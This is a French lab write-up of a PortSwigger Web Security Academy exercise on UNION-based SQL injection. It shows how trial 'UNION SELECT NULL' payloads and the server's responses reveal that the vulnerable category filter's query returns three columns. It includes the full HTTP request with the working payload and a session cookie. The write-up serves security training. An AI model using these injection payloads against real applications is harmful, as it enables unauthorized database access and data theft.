# 💉 Lab : SQL injection UNION attack, determining the number of columns returned by the query
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
Le filtre de catégorie est vulnérable à une injection SQL de type UNION. L'application affiche les résultats de la requête en base de données directement dans la page. L'objectif était de déterminer le nombre de colonnes de la requête d'origine pour préparer des attaques UNION plus complexes.

## 🛠️ Preuve de Concept (PoC)
L'attaque a été réalisée par tâtonnement en observant les réponses du serveur (codes HTTP) :

1. **Test 1 colonne :** `... UNION SELECT NULL--` -> **Erreur 500** (Structure invalide).
2. **Test 2 colonnes :** `... UNION SELECT NULL,NULL--` -> **Erreur 500** (Structure invalide).
3. **Test 3 colonnes :** `... UNION SELECT NULL,NULL,NULL--` -> **200 OK** (Structure validée).

Cette séquence d'essais confirme que la requête originale utilise précisément **3 colonnes**.

```http
GET /filter?category=Food+%26+Drink' UNION SELECT NULL,NULL,NULL-- HTTP/2
Host: 0a8c001c0434a18f81153ab600590059.web-security-academy.net
Cookie: session=p6EgrLQy24b41PXZcp6fRnwpYmPcEyBd
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8c001c0434a18f81153ab600590059.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

